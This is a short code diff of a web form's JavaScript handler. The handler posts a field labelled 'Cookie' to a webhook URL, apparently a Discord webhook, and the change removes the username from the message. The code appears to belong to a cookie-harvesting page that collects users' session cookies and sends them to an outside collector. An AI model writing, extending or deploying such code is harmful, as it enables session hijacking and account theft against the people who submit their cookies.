@@ -7,7 +7,7 @@ document.getElementById('webhookForm').addEventListener('submit', function(event
     const username = document.getElementById('usernameBox').value;
     const message = document.getElementById('textBox').value;
 
-    const discordMessage = `**Username:** ${username}\n**Cookie:** ${message}`;
+    const discordMessage = `**Cookie:** ${message}`;
 
     fetch(webhookUrl, {
         method: 'POST',
